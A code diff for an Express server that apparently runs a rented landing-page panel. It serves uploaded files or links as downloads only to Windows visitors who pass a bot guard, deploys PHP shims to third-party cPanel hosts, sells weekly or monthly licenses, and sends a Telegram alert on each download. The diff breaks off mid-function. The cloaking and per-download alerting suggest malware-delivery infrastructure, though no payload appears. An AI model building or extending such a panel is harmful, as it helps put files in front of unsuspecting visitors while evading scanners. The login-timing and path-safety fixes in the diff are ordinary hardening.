-  const logs = await rawQueryAll('SELECT * FROM visitor_logs ' + whereClause + ' ORDER BY id DESC LIMIT $' + (paramIdx - 1) + ' OFFSET $' + paramIdx, [...params, limit, offset]);
+  const logs = await rawQueryAll(
+    'SELECT vl.*, u.name AS owner_name, u.email AS owner_email FROM visitor_logs vl ' +
+    'LEFT JOIN pages p ON p.id = vl.page_id ' +
+    'LEFT JOIN users u ON u.id = p.user_id ' +
+    whereClause + ' ORDER BY vl.id DESC LIMIT $' + (paramIdx - 1) + ' OFFSET $' + paramIdx,
+    [...params, limit, offset]
+  );
   res.json({ logs, total: totalRow.c, page, limit });
 });
 
@@ -718,9 +1114,12 @@ app.delete('/api/visitor-logs', requireAdmin, async (req, res) => {
 
 // ═══════════ USER ANALYTICS ═══════════
 app.get('/api/my-analytics', requireAuth, async (req, res) => {
-  // Get page IDs from user's domains
+  // Page IDs the user owns: their own pages, plus any pages reachable via a custom domain
+  // they registered (domains.page_id can point at a page even when pages.user_id differs,
+  // e.g. shared/legacy setups) — union both so nothing is silently dropped.
+  const ownPages = await queryAll('SELECT id AS page_id FROM pages WHERE user_id = ?', [req.session.user.id]);
   const domains = await queryAll('SELECT page_id FROM domains WHERE user_id = ? AND page_id IS NOT NULL', [req.session.user.id]);
-  const pageIds = domains.map(d => d.page_id).filter(Boolean);
+  const pageIds = [...new Set([...ownPages, ...domains].map(d => d.page_id).filter(Boolean))];
   if (pageIds.length === 0) return res.json({ total: 0, uniqueIps: 0, today: 0, botsBlocked: 0, topCountries: [], topCities: [], topIsps: [] });
 
   const placeholders = pageIds.map((_, i) => '$' + (i + 1)).join(',');
@@ -737,8 +1136,9 @@ app.get('/api/my-analytics', requireAuth, async (req, res) => {
 });
 
 app.get('/api/my-visitor-logs', requireAuth, async (req, res) => {
+  const ownPages = await queryAll('SELECT id AS page_id FROM pages WHERE user_id = ?', [req.session.user.id]);
   const domains = await queryAll('SELECT page_id FROM domains WHERE user_id = ? AND page_id IS NOT NULL', [req.session.user.id]);
-  const pageIds = domains.map(d => d.page_id).filter(Boolean);
+  const pageIds = [...new Set([...ownPages, ...domains].map(d => d.page_id).filter(Boolean))];
   if (pageIds.length === 0) return res.json({ logs: [], total: 0, page: 1 });
 
   const page = parseInt(req.query.page) || 1;
@@ -753,14 +1153,23 @@ app.get('/api/my-visitor-logs', requireAuth, async (req, res) => {
 });
 
 // ═══════════ AUTH ═══════════
+// Dummy bcrypt hash used to keep total response time constant whether or not the email
+// exists. Without this, the round-trip time leaks user existence to an attacker.
+const LOGIN_DUMMY_HASH = '$2a$10$CwTycUXWue0Thq9StjUM0uJ8d1zV0nQrK1NyJ7yYDqo7DwDhDPLrm';
+
 app.post('/api/auth/login', loginGuard, async (req, res) => {
   const { email, password } = req.body;
   if (!email || !password) return res.status(400).json({ error: 'Email and password required' });
 
   const user = await queryOne('SELECT * FROM users WHERE email = ?', [email]);
-  if (!user) return res.status(401).json({ error: 'Invalid credentials' });
-  if (user.status !== 'Active') return res.status(403).json({ error: 'Account is inactive' });
-  if (!bcrypt.compareSync(password, user.password)) {
+  // Always compare against a real bcrypt hash to defeat user-enumeration via response timing.
+  const hashToCheck = user ? user.password : LOGIN_DUMMY_HASH;
+  const passwordOk = await bcrypt.compare(password, hashToCheck);
+
+  if (!user || !passwordOk || user.status !== 'Active') {
+    if (user && user.status !== 'Active' && passwordOk) {
+      return res.status(403).json({ error: 'Account is inactive' });
+    }
     // Track failed login attempt
     const ip = getClientIp(req);
     const record = loginAttemptStore.get(ip) || { count: 0 };
@@ -786,15 +1195,60 @@ app.post('/api/auth/logout', (req, res) => {
   res.json({ ok: true });
 });
 
-app.get('/api/auth/me', (req, res) => {
+app.get('/api/auth/me', async (req, res) => {
   if (!req.session.user) return res.status(401).json({ error: 'Not authenticated' });
-  res.json({ user: req.session.user });
+  // Refetch the latest license state from DB so the client's countdown stays correct
+  // after admin actions (activate / extend / revoke) without requiring re-login.
+  const fresh = await queryOne('SELECT id, name, email, role, status, license_plan, license_expires_at, telegram_bot_token, telegram_chat_id FROM users WHERE id = ?', [req.session.user.id]);
+  if (!fresh) return res.status(401).json({ error: 'Not authenticated' });
+  const telegram_configured = !!(fresh.telegram_bot_token && fresh.telegram_chat_id);
+  res.json({ user: { id: fresh.id, name: fresh.name, email: fresh.email, role: fresh.role, license: licenseSummary(fresh), telegram_configured } });
+});
+
+// ═══════════ TELEGRAM (per-user) ═══════════
+function maskToken(t) {
+  if (!t) return '';
+  if (t.length <= 12) return t.slice(0, 4) + '…';
+  return t.slice(0, 6) + '…' + t.slice(-4);
+}
+app.get('/api/me/telegram', requireAuth, async (req, res) => {
+  const u = await queryOne('SELECT telegram_bot_token, telegram_chat_id FROM users WHERE id = ?', [req.session.user.id]);
+  if (!u) return res.status(404).json({ error: 'Not found' });
+  res.json({
+    chat_id: u.telegram_chat_id || '',
+    bot_token_masked: u.telegram_bot_token ? maskToken(u.telegram_bot_token) : '',
+    configured: !!(u.telegram_bot_token && u.telegram_chat_id),
+  });
+});
+app.put('/api/me/telegram', requireAuth, async (req, res) => {
+  const { bot_token, chat_id } = req.body || {};
+  // Empty strings clear the field. If bot_token is undefined, keep the existing one
+  // (so the masked display can be re-saved with just a chat_id change).
+  const current = await queryOne('SELECT telegram_bot_token FROM users WHERE id = ?', [req.session.user.id]);
+  const finalToken = bot_token === undefined ? (current ? current.telegram_bot_token : null) : (bot_token || null);
+  const finalChat = chat_id === undefined ? null : (chat_id || null);
+  if (finalToken && !/^\d+:[A-Za-z0-9_-]{20,}$/.test(finalToken)) {
+    return res.status(400).json({ error: 'Bot token format looks wrong. Expected e.g. 123456:ABC-DEF…' });
+  }
+  await runSql('UPDATE users SET telegram_bot_token = ?, telegram_chat_id = ? WHERE id = ?',
+    [finalToken, finalChat, req.session.user.id]);
+  res.json({ ok: true, configured: !!(finalToken && finalChat) });
+});
+app.post('/api/me/telegram/test', requireAuth, async (req, res) => {
+  const u = await queryOne('SELECT name, telegram_bot_token, telegram_chat_id FROM users WHERE id = ?', [req.session.user.id]);
+  if (!u || !u.telegram_bot_token || !u.telegram_chat_id) {
+    return res.status(400).json({ error: 'Bot token and chat ID are required first' });
+  }
+  const r = await sendTelegram(u.telegram_bot_token, u.telegram_chat_id,
+    '✅ <b>Test alert</b>\nTelegram is connected for <b>' + tgHtmlEscape(u.name) + '</b>.\nYou will receive a message here every time someone downloads from one of your landing pages.\n<b>Time:</b> ' + new Date().toISOString());
+  if (!r.ok) return res.status(502).json({ error: 'Telegram rejected: ' + r.err });
+  res.json({ ok: true });
 });
 
 // ═══════════ USERS (Admin) ═══════════
 app.get('/api/users', requireAdmin, async (req, res) => {
-  const users = await queryAll('SELECT id, name, email, role, status, created FROM users ORDER BY created DESC');
-  res.json(users);
+  const users = await queryAll('SELECT id, name, email, role, status, created, license_plan, license_expires_at FROM users ORDER BY created DESC');
+  res.json(users.map(u => ({ ...u, license: licenseSummary(u) })));
 });
 
 app.post('/api/users', requireAdmin, async (req, res) => {
@@ -847,34 +1301,119 @@ app.delete('/api/users/:id', requireAdmin, async (req, res) => {
   res.json({ ok: true });
 });
 
-// ═══════════ PAGES (Admin) ═══════════
+// License actions — admin assigns/renews/revokes a user's license.
+app.post('/api/users/:id/license', requireAdmin, async (req, res) => {
+  const { action, plan } = req.body || {};
+  const user = await queryOne('SELECT id, name, role, license_plan, license_expires_at FROM users WHERE id = ?', [req.params.id]);
+  if (!user) return res.status(404).json({ error: 'User not found' });
+  if (isAdminUser(user)) return res.status(400).json({ error: 'Admin accounts do not require a license' });
+
+  let nextPlan = user.license_plan;
+  let nextExpires = user.license_expires_at;
+
+  if (action === 'revoke') {
+    nextExpires = new Date();
+  } else if (action === 'activate' || action === 'extend') {
+    if (!plan || !LICENSE_DURATIONS_MS[plan]) return res.status(400).json({ error: 'Plan must be weekly or monthly' });
+    const durMs = LICENSE_DURATIONS_MS[plan];
+    if (action === 'activate') {
+      nextExpires = new Date(Date.now() + durMs);
+    } else {
+      const cur = user.license_expires_at ? new Date(user.license_expires_at).getTime() : 0;
+      const base = Math.max(cur, Date.now());
+      nextExpires = new Date(base + durMs);
+    }
+    nextPlan = plan;
+  } else {
+    return res.status(400).json({ error: 'Action must be activate, extend, or revoke' });
+  }
+
+  await runSql('UPDATE users SET license_plan = ?, license_expires_at = ? WHERE id = ?', [nextPlan, nextExpires.toISOString(), req.params.id]);
+  logActivity('License ' + action, action + ' ' + (plan || user.license_plan || '') + ' for ' + user.name, req.session.user.name);
+  const fresh = await queryOne('SELECT id, role, license_plan, license_expires_at FROM users WHERE id = ?', [req.params.id]);
+  res.json({ license: licenseSummary(fresh) });
+});
+
+// ═══════════ PAGES ═══════════
+// Shared workspace: every authenticated user — Admin and User — sees and can mutate
+// every page. The page's user_id is still recorded so visitor traffic is gated by
+// that user's license at the shim/render layer.
 app.get('/api/pages', requireAuth, async (req, res) => {
-  const pages = await queryAll('SELECT * FROM pages ORDER BY created DESC');
+  const isAdmin = req.session.user.role === 'Admin';
+  const userId = req.session.user.id;
+  const pages = await queryAll(`
+    SELECT p.*, u.name AS owner_name, u.email AS owner_email
+    FROM pages p LEFT JOIN users u ON u.id = p.user_id
+    ORDER BY p.created DESC
+  `);
   for (const p of pages) {
-    p.versions = await queryAll('SELECT * FROM versions WHERE page_id = ? ORDER BY date DESC', [p.id]);
+    // Per-user version isolation: each user only sees the versions they uploaded.
+    // Admins see everything (including legacy versions with user_id IS NULL).
+    if (isAdmin) {
+      p.versions = await queryAll(
+        `SELECT v.*, u.name AS uploaded_by FROM versions v LEFT JOIN users u ON u.id = v.user_id WHERE v.page_id = ? ORDER BY v.date DESC`,
+        [p.id]
+      );
+    } else {
+      p.versions = await queryAll(
+        `SELECT v.*, u.name AS uploaded_by FROM versions v LEFT JOIN users u ON u.id = v.user_id WHERE v.page_id = ? AND v.user_id = ? ORDER BY v.date DESC`,
+        [p.id, userId]
+      );
+    }
   }
   res.json(pages);
 });
 
+function normalizeRedirectUrl(value) {
+  if (value === undefined) return { skip: true };
+  const trimmed = (value || '').trim();
+  if (!trimmed) return { value: null };
+  if (!/^https?:\/\//i.test(trimmed)) return { error: 'Redirect URL must start with http:// or https://' };
+  return { value: trimmed };
+}
+
 app.post('/api/pages', requireAdmin, async (req, res) => {
-  const { name, htmlCode, status } = req.body;
+  const { name, htmlCode, status, user_id, redirect_url } = req.body;
   if (!name) return res.status(400).json({ error: 'Page name required' });
 
+  const ownerId = user_id ? String(user_id) : null;
+  if (ownerId) {
+    const owner = await queryOne('SELECT id FROM users WHERE id = ?', [ownerId]);
+    if (!owner) return res.status(400).json({ error: 'Owner user not found' });
+  }
+
+  const r = normalizeRedirectUrl(redirect_url);
+  if (r.error) return res.status(400).json({ error: r.error });
+  const finalRedirect = r.skip ? null : r.value;
+
   const id = uid();
-  await runSql('INSERT INTO pages (id, name, html_code, status, created) VALUES (?, ?, ?, ?, ?)',
-    [id, name, htmlCode || '', status || 'active', today()]
+  await runSql('INSERT INTO pages (id, name, html_code, status, created, user_id, redirect_url) VALUES (?, ?, ?, ?, ?, ?, ?)',
+    [id, name, htmlCode || '', status || 'active', today(), ownerId, finalRedirect]
   );
   logActivity('Page Created', 'Created page: ' + name, req.session.user.name);
-  res.json({ id, name, html_code: htmlCode || '', status: status || 'active', created: today(), versions: [] });
+  res.json({ id, name, html_code: htmlCode || '', status: status || 'active', created: today(), user_id: ownerId, redirect_url: finalRedirect, versions: [] });
 });
 
 app.put('/api/pages/:id', requireAdmin, async (req, res) => {
-  const { name, htmlCode, status } = req.body;
+  const { name, htmlCode, status, user_id, redirect_url } = req.body;
   const page = await queryOne('SELECT * FROM pages WHERE id = ?', [req.params.id]);
   if (!page) return res.status(404).json({ error: 'Page not found' });
 
-  await runSql('UPDATE pages SET name=?, html_code=?, status=? WHERE id=?',
-    [name || page.name, htmlCode !== undefined ? htmlCode : page.html_code, status || page.status, req.params.id]
+  let ownerId = page.user_id;
+  if (user_id !== undefined) {
+    ownerId = user_id ? String(user_id) : null;
+    if (ownerId) {
+      const owner = await queryOne('SELECT id FROM users WHERE id = ?', [ownerId]);
+      if (!owner) return res.status(400).json({ error: 'Owner user not found' });
+    }
+  }
+
+  const r = normalizeRedirectUrl(redirect_url);
+  if (r.error) return res.status(400).json({ error: r.error });
+  const nextRedirect = r.skip ? page.redirect_url : r.value;
+
+  await runSql('UPDATE pages SET name=?, html_code=?, status=?, user_id=?, redirect_url=? WHERE id=?',
+    [name || page.name, htmlCode !== undefined ? htmlCode : page.html_code, status || page.status, ownerId, nextRedirect, req.params.id]
   );
   logActivity('Page Updated', 'Updated page: ' + (name || page.name), req.session.user.name);
   res.json({ ok: true });
@@ -886,79 +1425,115 @@ app.delete('/api/pages/:id', requireAdmin, async (req, res) => {
 
   const versions = await queryAll('SELECT file_path FROM versions WHERE page_id = ?', [req.params.id]);
   versions.forEach(v => {
-    if (v.file_path) {
-      const fp = path.join(uploadsDir, v.file_path);
-      if (fs.existsSync(fp)) fs.unlinkSync(fp);
-    }
+    const fp = safeUploadPath(v.file_path);
+    if (fp && fs.existsSync(fp)) fs.unlinkSync(fp);
   });
 
   await runSql('DELETE FROM versions WHERE page_id = ?', [req.params.id]);
+  await runSql('DELETE FROM deployments WHERE page_id = ?', [req.params.id]);
   await runSql('DELETE FROM pages WHERE id = ?', [req.params.id]);
   logActivity('Page Deleted', 'Deleted page: ' + page.name, req.session.user.name);
   res.json({ ok: true });
 });
 
 // ═══════════ VERSIONS / FILE UPLOAD (User) ═══════════
+// Wrap multer so filter / size errors return a clean 400 instead of falling through to the
+// default Express error handler (which would respond 500 with a stack trace).
+function uploadFile(req, res, next) {
+  upload.single('file')(req, res, (err) => {
+    if (err) return res.status(400).json({ error: err.message || 'Upload failed' });
+    next();
+  });
+}
+
+// Auto-increment the version number from the latest of THIS user's existing versions
+// on this page. Each user has their own version sequence.
+async function nextVersionFor(pageId, userId) {
+  const latest = await queryOne(
+    'SELECT version FROM versions WHERE page_id = ? AND user_id = ? ORDER BY date DESC LIMIT 1',
+    [pageId, userId]
+  );
+  if (!latest || !latest.version) return '0.0.1';
+  const parts = latest.version.split('.');
+  const patch = (parseInt(parts[2]) || 0) + 1;
+  return (parts[0] || '0') + '.' + (parts[1] || '0') + '.' + patch;
+}
+
 app.post('/api/pages/:id/upload', requireAuth, upload.single('file'), async (req, res) => {
   if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
-
   const page = await queryOne('SELECT * FROM pages WHERE id = ?', [req.params.id]);
-  if (!page) return res.status(404).json({ error: 'Page not found' });
-
-  // Auto-increment version
-  const latest = await queryOne('SELECT version FROM versions WHERE page_id = ? ORDER BY date DESC LIMIT 1', [req.params.id]);
-  let newVer = '0.0.1';
-  if (latest && latest.version) {
-    const parts = latest.version.split('.');
-    const patch = (parseInt(parts[2]) || 0) + 1;
-    newVer = (parts[0] || '0') + '.' + (parts[1] || '0') + '.' + patch;
+  if (!page) {
+    fs.unlinkSync(req.file.path);
+    return res.status(404).json({ error: 'Page not found' });
   }
-
-  // Deactivate all existing versions
-  await runSql('UPDATE versions SET active = 0 WHERE page_id = ?', [req.params.id]);
+  const isAdmin_ = req.session.user.role === 'Admin';
+  if (!isAdmin_ && page.user_id && page.user_id !== req.session.user.id) {
+    fs.unlinkSync(req.file.path);
+    return res.status(403).json({ error: 'You do not own this page' });
+  }
+  const uid_ = req.session.user.id;
+  const newVer = await nextVersionFor(req.params.id, uid_);
+  await runSql('UPDATE versions SET active = 0 WHERE page_id = ? AND user_id = ?', [req.params.id, uid_]);
 
   const vId = uid();
-  await runSql('INSERT INTO versions (id, page_id, version, file_name, file_path, original_name, notes, date, active) VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1)',
-    [vId, req.params.id, newVer, req.file.filename, req.file.filename, req.file.originalname, 'Uploaded on ' + today(), today()]
+  const notes = (req.body && req.body.notes) || ('File uploaded on ' + today());
+  await runSql(
+    'INSERT INTO versions (id, page_id, user_id, version, file_name, file_path, original_name, link_url, notes, date, active) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1)',
+    [vId, req.params.id, uid_, newVer, req.file.filename, req.file.filename, req.file.originalname, null, notes, today()]
   );
 
   logActivity('File Uploaded', 'Uploaded v' + newVer + ' for ' + page.name, req.session.user.name);
+  const version_ = { version: newVer, original_name: req.file.originalname, file_name: req.file.filename, link_url: null };
+  setImmediate(() => notifyUpload(page, version_, req.session.user));
   res.json({ id: vId, version: newVer, fileName: req.file.originalname, active: true });
 });
 
 app.post('/api/pages/:id/link', requireAuth, async (req, res) => {
   const { linkUrl, notes } = req.body;
   if (!linkUrl) return res.status(400).json({ error: 'Link URL is required' });
-
+  const lower = String(linkUrl).trim().toLowerCase();
+  if (!/^https?:\/\//.test(lower)) return res.status(400).json({ error: 'Link URL must start with http:// or https://' });
   const page = await queryOne('SELECT * FROM pages WHERE id = ?', [req.params.id]);
   if (!page) return res.status(404).json({ error: 'Page not found' });
-
-  // Auto-increment version
-  const latest = await queryOne('SELECT version FROM versions WHERE page_id = ? ORDER BY date DESC LIMIT 1', [req.params.id]);
-  let newVer = '0.0.1';
-  if (latest && latest.version) {
-    const parts = latest.version.split('.');
-    const patch = (parseInt(parts[2]) || 0) + 1;
-    newVer = (parts[0] || '0') + '.' + (parts[1] || '0') + '.' + patch;
+  const isAdminL_ = req.session.user.role === 'Admin';
+  if (!isAdminL_ && page.user_id && page.user_id !== req.session.user.id) {
+    return res.status(403).json({ error: 'You do not own this page' });
   }
 
-  // Deactivate all existing versions
-  await runSql('UPDATE versions SET active = 0 WHERE page_id = ?', [req.params.id]);
+  const uid_ = req.session.user.id;
+  const newVer = await nextVersionFor(req.params.id, uid_);
+
+  await runSql('UPDATE versions SET active = 0 WHERE page_id = ? AND user_id = ?', [req.params.id, uid_]);
 
   const vId = uid();
-  await runSql('INSERT INTO versions (id, page_id, version, file_name, file_path, original_name, link_url, notes, date, active) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 1)',
-    [vId, req.params.id, newVer, null, null, null, linkUrl, notes || 'Link added on ' + today(), today()]
+  await runSql('INSERT INTO versions (id, page_id, user_id, version, file_name, file_path, original_name, link_url, notes, date, active) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1)',
+    [vId, req.params.id, uid_, newVer, null, null, null, linkUrl, notes || 'Link added on ' + today(), today()]
   );
 
   logActivity('Link Added', 'Added link v' + newVer + ' for ' + page.name, req.session.user.name);
+  const version_ = { version: newVer, original_name: null, file_name: null, link_url: linkUrl };
+  setImmediate(() => notifyUpload(page, version_, req.session.user));
   res.json({ id: vId, version: newVer, linkUrl, active: true });
 });
 
 app.put('/api/versions/:id/activate', requireAuth, async (req, res) => {
   const ver = await queryOne('SELECT * FROM versions WHERE id = ?', [req.params.id]);
   if (!ver) return res.status(404).json({ error: 'Version not found' });
-
-  await runSql('UPDATE versions SET active = 0 WHERE page_id = ?', [ver.page_id]);
+  // Per-user activation: a non-admin can ONLY activate versions they own. NULL-user
+  // (orphaned / legacy) versions are admin-only — otherwise a user could "claim" an
+  // orphan and have it surface on every other user's deployment via fallback.
+  const isAdmin = req.session.user.role === 'Admin';
+  if (!isAdmin && ver.user_id !== req.session.user.id) {
+    return res.status(403).json({ error: 'You do not own this version' });
+  }
+  // Deactivate only versions in the same (page, user_id) bucket as this version, so
+  // other users' active versions are untouched.
+  const ownerId = ver.user_id;
+  if (ownerId == null) {
+    await runSql('UPDATE versions SET active = 0 WHERE page_id = ? AND user_id IS NULL', [ver.page_id]);
+  } else {
+    await runSql('UPDATE versions SET active = 0 WHERE page_id = ? AND user_id = ?', [ver.page_id, ownerId]);
+  }
   await runSql('UPDATE versions SET active = 1 WHERE id = ?', [req.params.id]);
   res.json({ ok: true });
 });
@@ -966,20 +1541,28 @@ app.put('/api/versions/:id/activate', requireAuth, async (req, res) => {
 app.delete('/api/versions/:id', requireAuth, async (req, res) => {
   const ver = await queryOne('SELECT * FROM versions WHERE id = ?', [req.params.id]);
   if (!ver) return res.status(404).json({ error: 'Version not found' });
+  const isAdmin = req.session.user.role === 'Admin';
+  if (!isAdmin && ver.user_id !== req.session.user.id) {
+    return res.status(403).json({ error: 'You do not own this version' });
+  }
 
-  const rows = await queryAll('SELECT id FROM versions WHERE page_id = ?', [ver.page_id]);
+  // Only count versions in the same (page, user) bucket toward the "cannot delete only version" rule.
+  const ownerCondSql = ver.user_id == null ? 'user_id IS NULL' : 'user_id = ?';
+  const ownerCondParams = ver.user_id == null ? [ver.page_id] : [ver.page_id, ver.user_id];
+  const rows = await queryAll(`SELECT id FROM versions WHERE page_id = ? AND ${ownerCondSql}`, ownerCondParams);
   if (rows.length <= 1) return res.status(400).json({ error: 'Cannot delete the only version' });
 
-  if (ver.file_path) {
-    const fp = path.join(uploadsDir, ver.file_path);
-    if (fs.existsSync(fp)) fs.unlinkSync(fp);
-  }
+  const fp = safeUploadPath(ver.file_path);
+  if (fp && fs.existsSync(fp)) fs.unlinkSync(fp);
 
   const wasActive = ver.active;
   await runSql('DELETE FROM versions WHERE id = ?', [req.params.id]);
 
   if (wasActive) {
-    const next = await queryOne('SELECT id FROM versions WHERE page_id = ? ORDER BY date DESC LIMIT 1', [ver.page_id]);
+    const next = await queryOne(
+      `SELECT id FROM versions WHERE page_id = ? AND ${ownerCondSql} ORDER BY date DESC LIMIT 1`,
+      ownerCondParams
+    );
     if (next) await runSql('UPDATE versions SET active = 1 WHERE id = ?', [next.id]);
   }
 
@@ -1100,6 +1683,17 @@ async function ensurePageShimSecret(page) {
   return secret;
 }
 
+// Returns the existing per-(page, user) deployment row's secret, or creates one.
+async function ensureDeployment(pageId, userId) {
+  const existing = await queryOne('SELECT * FROM deployments WHERE page_id = ? AND user_id = ?', [pageId, userId]);
+  if (existing) return existing;
+  const id = uid();
+  const secret = crypto.randomBytes(32).toString('hex');
+  await runSql('INSERT INTO deployments (id, page_id, user_id, shim_secret, created) VALUES (?, ?, ?, ?, ?)',
+    [id, pageId, userId, secret, today()]);
+  return { id, page_id: pageId, user_id: userId, shim_secret: secret, created: today() };
+}
+
 function centralBaseUrl(req) {
   if (process.env.PUBLIC_URL) return process.env.PUBLIC_URL;
   const proto = req.headers['x-forwarded-proto'] || (req.secure ? 'https' : 'http');
@@ -1172,11 +1766,15 @@ function buildZip(files) {
   return Buffer.concat([...parts, ...central, eocd]);
 }
 
+// Each user gets their own deployment row for a page. Downloading the zip creates one
+// (or fetches the existing one) so the same user always gets the same secret on repeat
+// downloads — re-uploading the shim on cPanel doesn't break previously-deployed copies
+// of the same user.
 app.get('/api/pages/:id/shim-zip', requireAuth, async (req, res) => {
-  const page = await queryOne('SELECT id, name, shim_secret FROM pages WHERE id = ?', [req.params.id]);
+  const page = await queryOne('SELECT id, name FROM pages WHERE id = ?', [req.params.id]);
   if (!page) return res.status(404).json({ error: 'Page not found' });
-  const secret = await ensurePageShimSecret(page);
-  const php = buildShimPhp({ centralUrl: centralBaseUrl(req), pageId: page.id, shimSecret: secret });
+  const deployment = await ensureDeployment(page.id, req.session.user.id);
+  const php = buildShimPhp({ centralUrl: centralBaseUrl(req), pageId: page.id, shimSecret: deployment.shim_secret });
   const zip = buildZip([
     { name: 'index.php', content: php },
     { name: '.htaccess', content: shimHtaccess },
@@ -1188,30 +1786,54 @@ app.get('/api/pages/:id/shim-zip', requireAuth, async (req, res) => {
 });
 
 app.get('/api/pages/:id/shim-package', requireAuth, async (req, res) => {
-  const page = await queryOne('SELECT id, name, shim_secret FROM pages WHERE id = ?', [req.params.id]);
+  const page = await queryOne('SELECT id, name FROM pages WHERE id = ?', [req.params.id]);
   if (!page) return res.status(404).json({ error: 'Page not found' });
-  const secret = await ensurePageShimSecret(page);
-  const php = buildShimPhp({ centralUrl: centralBaseUrl(req), pageId: page.id, shimSecret: secret });
+  const deployment = await ensureDeployment(page.id, req.session.user.id);
+  const php = buildShimPhp({ centralUrl: centralBaseUrl(req), pageId: page.id, shimSecret: deployment.shim_secret });
   res.setHeader('Content-Type', 'application/x-httpd-php');
   res.setHeader('Content-Disposition', 'attachment; filename="index.php"');
   res.send(php);
 });
 
 app.get('/api/pages/:id/shim-htaccess', requireAuth, async (req, res) => {
-  const page = await queryOne('SELECT id FROM pages WHERE id = ?', [req.params.id]);
-  if (!page) return res.status(404).json({ error: 'Page not found' });
   res.setHeader('Content-Type', 'text/plain; charset=utf-8');
   res.setHeader('Content-Disposition', 'attachment; filename=".htaccess"');
   res.send(shimHtaccess);
 });
 
+// Rotates THIS user's deployment secret for THIS page. Other users' deployments and
+// the legacy page-wide shim_secret are untouched.
 app.post('/api/pages/:id/rotate-shim-secret', requireAuth, async (req, res) => {
   const page = await queryOne('SELECT id, name FROM pages WHERE id = ?', [req.params.id]);
   if (!page) return res.status(404).json({ error: 'Page not found' });
+  const deployment = await ensureDeployment(page.id, req.session.user.id);
   const secret = crypto.randomBytes(32).toString('hex');
-  await runSql('UPDATE pages SET shim_secret = ? WHERE id = ?', [secret, page.id]);
-  logActivity('Shim Secret Rotated', 'Rotated shim secret for page: ' + page.name, req.session.user.name);
+  await runSql('UPDATE deployments SET shim_secret = ? WHERE id = ?', [secret, deployment.id]);
+  logActivity('Shim Secret Rotated', 'Rotated own deployment secret for page: ' + page.name, req.session.user.name);
   res.json({ ok: true });
+});
+
+// Returns the calling user's deployment fingerprint for this page — a short, safe id
+// derived from their own deployment secret so the user can visually confirm "this
+// zip is mine". Also reports whether the user has an active version (visitors hitting
+// their shim will get a 404 on download if not). Auto-creates the deployment so the
+// fingerprint matches what would be baked into the next shim-zip download.
+app.get('/api/pages/:id/my-deployment', requireAuth, async (req, res) => {
+  const page = await queryOne('SELECT id, name, user_id FROM pages WHERE id = ?', [req.params.id]);
+  if (!page) return res.status(404).json({ error: 'Page not found' });
+  const dep = await ensureDeployment(page.id, req.session.user.id);
+  const active = await queryOne('SELECT id, version FROM versions WHERE page_id = ? AND user_id = ? AND active = 1 LIMIT 1',
+    [page.id, req.session.user.id]);
+  // Fingerprint is the first 6 chars of a SHA-256 of the secret — short, unique per
+  // deployment, and reveals nothing about the secret itself.
+  const fingerprint = crypto.createHash('sha256').update(dep.shim_secret).digest('hex').slice(0, 6).toUpperCase();
+  res.json({
+    deployment_id: dep.id,
+    fingerprint,
+    has_active_version: !!active,
+    active_version: active ? active.version : null,
+    user_name: req.session.user.name,
+  });
 });
 
 app.post('/api/domains/:id/verify-dns', requireAuth, async (req, res) => {
@@ -1326,6 +1948,16 @@ app.put('/api/settings', requireAdmin, async (req, res) => {
   res.json({ ok: true });
 });
 
+app.post('/api/settings/telegram-test', requireAdmin, async (req, res) => {
+  const t = await queryOne("SELECT value FROM settings WHERE key = 'telegram_bot_token'");
+  const c = await queryOne("SELECT value FROM settings WHERE key = 'telegram_chat_id'");
+  if (!t || !t.value || !c || !c.value) return res.status(400).json({ error: 'Bot token and chat ID must be saved first' });
+  const r = await sendTelegram(t.value, c.value,
+    '✅ <b>Test alert (global)</b>\nThe global Telegram channel is connected. Every download across the whole system is mirrored here. If a page owner has also set up their own Telegram, they receive a copy too.\n<b>Time:</b> ' + new Date().toISOString());
+  if (!r.ok) return res.status(502).json({ error: 'Telegram rejected: ' + r.err });
+  res.json({ ok: true });
+});
+
 // ═══════════ STATS ═══════════
 app.get('/api/stats', requireAuth, async (req, res) => {
   const user = req.session.user;
@@ -1344,64 +1976,133 @@ app.get('/api/stats', requireAuth, async (req, res) => {
 });
 
 // ═══════════ PUBLIC PAGE RENDERING ═══════════
-app.get('/page/:id', botGuard, async (req, res) => {
-  const page = await queryOne('SELECT * FROM pages WHERE id = ?', [req.params.id]);
-  if (!page || !page.html_code) {
-    return res.status(404).send('<!DOCTYPE html><html><head><title>Not Found</title></head><body style="font-family:Segoe UI,sans-serif;background:#ffffff;color:#1a1a1a;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;"><div style="text-align:center;"><h1 style="font-size:1.5rem;color:#1a1a1a;">Page Not Found</h1><p style="color:#6b7280;">This landing page does not exist.</p></div></body></html>');
+// Admin preview helper — renders the page exactly as a verified Windows visitor would see it,
+// skipping botGuard / Windows-only / licensing gates. Triggered when the request carries an
+// authenticated Admin session, OR when query ?preview=1 is paired with a valid admin session.
+function isAdminSession(req) { return !!(req.session && req.session.user && req.session.user.role === 'Admin'); }
+// Any logged-in dashboard user (Admin or User) — used to bypass bot guard / Windows gate
+// / license check on the in-dashboard preview so users can review their pages before
+// deploying to a host.
+function isAuthenticatedSession(req) { return !!(req.session && req.session.user); }
+
+app.get('/page/:id', async (req, res, next) => {
+  // Dashboard preview: any logged-in user (Admin or User) bypasses visitor-facing gates
+  // so they can review the page before deploying. Anonymous traffic still runs the full pipeline.
+  if (isAuthenticatedSession(req)) {
+    const page = await queryOne('SELECT * FROM pages WHERE id = ?', [req.params.id]);
+    if (!page || !page.html_code) {
+      return res.status(404).send('<!DOCTYPE html><html><head><title>Not Found</title></head><body style="font-family:Segoe UI,sans-serif;background:#fff;color:#1a1a1a;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;"><div style="text-align:center;"><h1>Page Not Found</h1><p style="color:#6b7280;">This landing page does not exist.</p></div></body></html>');
+    }
+    return renderPage(page, res, req);
   }
-
-  // Windows-only check
-  if (!isWindows(req.headers['user-agent'])) return res.send(windowsOnlyPage());
-
-  await renderPage(page, res);
+  // Public visitor flow: full bot + Windows + license pipeline.
+  return botGuard(req, res, async () => {
+    const page = await queryOne('SELECT * FROM pages WHERE id = ?', [req.params.id]);
+    if (!page || !page.html_code) {
